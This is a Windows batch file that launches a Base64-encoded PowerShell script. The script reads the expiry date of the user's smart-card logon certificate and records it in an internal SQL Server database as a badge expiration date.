@echo off
powershell.exe -NoExit -encodedCommand JABDAHUAcgByAGUAbgB0AEMAZQByAHQAcwAgAD0AIABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAAQwBlAHIAdAA6AFwAQwB1AHIAcgBlAG4AdABVAHMAZQByAFwATQB5ACAALQBSAGUAYwB1AHIAcwBlACAAfAAgAD8AIAB7ACQAXwAuAEcAZQB0AFQAeQBwAGUAKAApAC4ATgBhAG0AZQAgAC0AZQBxACAAJwBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQAyACcAfQAgAHwADQAKAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsADQAKACAAJABGAGkAbgBhAGwARABhAHQAZQAgAD0AIABHAGUAdAAtAEQAYQB0AGUAIAAkAF8ALgBOAG8AdABBAGYAdABlAHIAIAAtAEYAbwByAG0AYQB0ACAAJwB5AHkAeQB5AE0ATQBkAGQAJwANAAoAIAAgACAAIAAkAFUAcwBhAGcAZQBzACAAPQAgAGYAbwByAGUAYQBjAGgAKAAkAGsAZQB5ACAAaQBuACAAJABfAC4ARQB4AHQAZQBuAHMAaQBvAG4AcwApAHsADQAKACAAIAAgACAAIAAgAGkAZgAoACcASwBlAHkAVQBzAGEAZwBlAHMAJwAgAC0AaQBuACAAJABrAGUAeQAuAHAAcwBvAGIAagBlAGMAdAAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBOAGEAbQBlACAAKQB7ACAAJABrAGUAeQAuAEsAZQB5AFUAcwBhAGcAZQBzAH0ADQAKACAAIAAgACAAIAAgAGkAZgAoACcARQBuAGgAYQBuAGMAZQBkAEsAZQB5AFUAcwBhAGcAZQBzACcAIAAtAGkAbgAgACQAawBlAHkALgBwAHMAbwBiAGoAZQBjAHQALgBQAHIAbwBwAGUAcgB0AGkAZQBzAC4ATgBhAG0AZQApAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAJABrAGUAeQAuAEUAbgBoAGEAbgBjAGUAZABLAGUAeQBVAHMAYQBnAGUAcwAuAEYAcgBpAGUAbgBkAGwAeQBOAGEAbQBlAA0ACgAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsADQAKACAAIAAgACAAIAAgACAAIABTAHUAYgBqAGUAYwB0ACAAIAAgACAAIAAgACAAPQAgACQAXwAuAFMAdQBiAGoAZQBjAHQADQAKACAAIAAgACAAIAAgACAAIABFAHgAcABpAHIAZQBEAGEAdABlACAAIAAgACAAPQAgACQARgBpAG4AYQBsAEQAYQB0AGUADQAKACAAIAAgACAAIAAgACAAIABVAHMAYQBnAGUAcwAgACAAIAAgACAAIAAgACAAPQAgACQAVQBzAGEAZwBlAHMALQBqAG8AaQBuACAAJwA7ACcADQAKACAAIAAgACAAfQANAAoAfQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsADQAKACAAIAAgACAAKAAkAF8ALgBEAGEAeQBzAFIAZQBtAGEAaQBuAGkAbgBnACAALQBsAHQAIAAzADYANQAwACAAKQAgAC0AYQBuAGQAIAAoACQAXwAuAFUAcwBhAGcAZQBzACAALQBtAGEAdABjAGgAIAAnAFMAbQBhAHIAdAAgAEMAYQByAGQAIABMAG8AZwBvAG4AJwApACAALQBhAG4AZAAgACgAJABfAC4AUwB1AGIAagBlAGMAdAAgAC0AbgBvAHQAbQBhAHQAYwBoACAAJwBBAGQAbQBpAG4AIABBAGMAYwBvAHUAbgB0AHMAJwApACAALQBhAG4AZAAgACgAJABfAC4ARQB4AHAAaQByAGUARABhAHQAZQAgAC0AbgBlACAAJwAwACcAKQANAAoAfQAgAHwAIABzAG8AcgB0ACAAewAgACQAXwAuAEUAeABwAGkAcgBlAEQAYQB0AGUAIAB9ACAALQBkAGUAcwBjACAADQAKACQARgBpAG4AYQBsAEUAeABwAGkAcgBlAEQAYQB0AGUAIAA9ACAAJABDAHUAcgByAGUAbgB0AEMAZQByAHQAcwBbADAAXQAuAEUAeABwAGkAcgBlAEQAYQB0AGUADQAKACQAcwBxAGwAVQBwAGQAYQB0AGUAIAA9ACAAIgBVAFAARABBAFQARQAgAFsAQwBNAF0ALgBbAG4AYQBtAGUAXwBtAGEAcwB0AGUAcgBfAHYAaQBlAHcAXQAgAFMARQBUACAAQgBBAEQARwBFAF8AQwBFAFIAVABfAEUAWABQAEkAUgBBAFQASQBPAE4AXwBEAEEAVABFAD0AJwAkAEYAaQBuAGEAbABFAHgAcABpAHIAZQBEAGEAdABlACcAIABXAEgARQBSAEUAIABJAEQAPQBDAE0ALgBNAFkAXwBVAFMARQBSAEkARAAoACkAIgANAAoAJABkAGEAdABhAFMAbwB1AHIAYwBlACAAPQAgACIAUABLAEMAQwBPAEQAVwBDAFMAUQBMADAAMAAsADEANAA0ADcAIgANAAoAJABkAGEAdABhAGIAYQBzAGUAIAA9ACAAIgBLAEMAQwBCAEUAUwB0AHIAdQBjAHQAdQByAGUAUwBRAEwAIgANAAoAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFMAdAByAGkAbgBnACAAPQAgACIARABhAHQAYQAgAFMAbwB1AHIAYwBlAD0AJABkAGEAdABhAFMAbwB1AHIAYwBlADsAIAAiACAAKwAgACIASQBuAHQAZQBnAHIAYQB0AGUAZAAgAFMAZQBjAHUAcgBpAHQAeQA9AFMAUwBQAEkAOwAgACIAIAArACAAIgBJAG4AaQB0AGkAYQBsACAAQwBhAHQAYQBsAG8AZwA9ACQAZABhAHQAYQBiAGEAcwBlACIADQAKACQAYwBvAG4AbgBlAGMAdABpAG8AbgAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBkAGEAdABhAC4AUwBxAGwAQwBsAGkAZQBuAHQALgBTAFEATABDAG8AbgBuAGUAYwB0AGkAbwBuACgAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFMAdAByAGkAbgBnACkADQAKACQAYwBvAG0AbQBhAG4AZAAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBkAGEAdABhAC4AcwBxAGwAYwBsAGkAZQBuAHQALgBzAHEAbABjAG8AbQBtAGEAbgBkACgAJABzAHEAbABVAHAAZABhAHQAZQAsACQAYwBvAG4AbgBlAGMAdABpAG8AbgApAA0ACgAkAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgBPAHAAZQBuACgAKQANAAoAJABjAG8AbQBtAGEAbgBkAC4ARQB4AGUAYwB1AHQAZQBOAG8AbgBRAHUAZQByAHkAKAApAA0ACgAkAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgBDAGwAbwBzAGUAKAApAA0ACgByAGUAdAB1AHIAbgAgACQAcwBxAGwAVQBwAGQAYQB0AGUADQAKAA==
